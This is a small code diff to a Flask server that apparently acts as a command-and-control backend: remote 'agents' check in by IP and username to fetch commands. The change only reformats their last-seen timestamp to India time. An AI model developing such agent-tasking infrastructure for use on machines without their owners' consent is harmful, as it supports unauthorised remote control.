@@ -2,7 +2,9 @@ from gevent import monkey
 monkey.patch_all()
 import time
 import os
+from datetime import datetime
 import base64
+import pytz
 from flask import Flask, json, request, jsonify, Response
 from pymongo import MongoClient
 
@@ -34,12 +36,14 @@ def home():
 
 @app.route('/api/<ip>/<username>', methods=['GET'])
 def check_command(ip, username):
+    target_tz = pytz.timezone('Asia/Kolkata')
+    lastseen = datetime.now(target_tz).strftime("%Y-%m-%d %H:%M:%S")
     db = MongoHelper.get_db()
     print(f"Checking for commands for IP: {ip.strip()}")
 
     active_agents[ip.strip()] = {
             "username": username,
-            "last_seen": time.time(),
+            "last_seen": lastseen,
             "status": "Online"
         }
     print(f"[*] Agent Joined: {username} ({ip})")
